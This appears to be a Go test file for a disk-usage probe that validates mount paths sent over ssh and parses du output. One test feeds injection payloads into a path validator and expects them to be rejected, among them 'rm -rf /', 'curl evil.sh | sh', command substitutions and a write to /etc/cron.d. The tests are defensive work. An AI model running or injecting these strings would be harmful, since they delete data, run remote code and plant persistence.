package probe

import (
	"errors"
	"os"
	"strings"
	"testing"
)

// A mount point reaches a remote shell through ssh's argv concatenation and
// arrives from that host's own df output.
func TestPathRejectsShellInjection(t *testing.T) {
	for _, p := range []string{
		"/var; rm -rf /",
		"/var && curl evil.sh | sh",
		"/$(whoami)",
		"/`id`",
		"/var\nrm -rf /",
		"/var|tee /etc/cron.d/x",
		"/var>out",
		"/var*",
		"relative/path",
		"",
		"/var'",
	} {
		if err := ValidatePath(p); !errors.Is(err, ErrUnsafePath) {
			t.Errorf("ValidatePath(%q) = %v, want ErrUnsafePath", p, err)
		}
	}
}

// A mount point may legitimately contain a space; the script rejoins the
// pieces with "$*", so these must be accepted.
func TestPathAcceptsRealMounts(t *testing.T) {
	for _, p := range []string{"/", "/var", "/var/log", "/mnt/data disk", "/srv/app-1_2.3"} {
		if err := ValidatePath(p); err != nil {
			t.Errorf("ValidatePath(%q) = %v, want nil", p, err)
		}
	}
}

func TestGoldenDuRoot(t *testing.T) {
	raw, err := os.ReadFile("testdata/du/var-root.txt")
	if err != nil {
		t.Skip("fixture missing")
	}
	d, err := ParseDu(raw)
	if err != nil {
		t.Fatal(err)
	}
	if d.Path != "/var" {
		t.Errorf("path = %q", d.Path)
	}
	if d.Total() <= 0 {
		t.Fatal("no total for the requested path")
	}
	if !d.Exact() {
		t.Errorf("root read everything; exact should hold (unreadable=%d timedout=%v)", d.Unreadable, d.TimedOut)
	}

	kids := d.Children()
	if len(kids) < 2 {
		t.Fatalf("got %d children", len(kids))
	}
	// Largest first, and the parent must never appear among its children.
	for i := 1; i < len(kids); i++ {
		if kids[i-1].KB < kids[i].KB {
			t.Errorf("children out of order at %d", i)
		}
	}
	for _, k := range kids {
		if k.Path == d.Path {
			t.Error("the requested path leaked into its own children")
		}
	}
	if share := d.Share(kids[0]); share <= 0 || share > 100 {
		t.Errorf("share = %.1f", share)
	}
}

// The number that matters: an unprivileged du skips what it cannot read and
// still prints a plausible total.
func TestGoldenDuUnprivilegedIsMarkedInexact(t *testing.T) {
	raw, err := os.ReadFile("testdata/du/var-unprivileged.txt")
	if err != nil {
		t.Skip("fixture missing")
	}
	d, err := ParseDu(raw)
	if err != nil {
		t.Fatal(err)
	}
	if d.Unreadable == 0 {
		t.Fatal("the fixture account cannot read parts of /var; that must be counted")
	}
	if d.Exact() {
		t.Error("a run that skipped directories must not claim to be exact")
	}

	// And it really does undercount, which is why this matters.
	root, err := os.ReadFile("testdata/du/var-root.txt")
	if err == nil {
		full, _ := ParseDu(root)
		if d.Total() >= full.Total() {
			t.Errorf("unprivileged total %d should be below root's %d", d.Total(), full.Total())
		}
	}
}

// du writes "<kb>\t<path>", and the tab is what keeps a path with spaces
// intact.
func TestDuPathWithSpaces(t *testing.T) {
	in := "rove-du 1\ndu.path=/mnt/data disk\nentry=4096\t/mnt/data disk\nentry=2048\t/mnt/data disk/logs\n"
	d, err := ParseDu([]byte(in))
	if err != nil {
		t.Fatal(err)
	}
	if d.Total() != 4096 {
		t.Errorf("total = %d", d.Total())
	}
	kids := d.Children()
	if len(kids) != 1 || kids[0].Path != "/mnt/data disk/logs" {
		t.Errorf("children = %+v", kids)
	}
}

func TestDuTimeoutIsReported(t *testing.T) {
	d, err := ParseDu([]byte("rove-du 1\ndu.path=/\ndu.timedout=1\nentry=100\t/\n"))
	if err != nil {
		t.Fatal(err)
	}
	if !d.TimedOut || d.Exact() {
		t.Error("a capped walk reports a floor, not a figure")
	}
}

func TestDuErrorSurfaces(t *testing.T) {
	d, _ := ParseDu([]byte("rove-du 1\ndu.path=/nope\ndu.error=du: cannot access '/nope': No such file or directory\n"))
	if d.Err == "" || len(d.Entries) != 0 {
		t.Errorf("err=%q entries=%d", d.Err, len(d.Entries))
	}
	if !strings.Contains(d.Err, "No such file") {
		t.Errorf("err = %q", d.Err)
	}
}
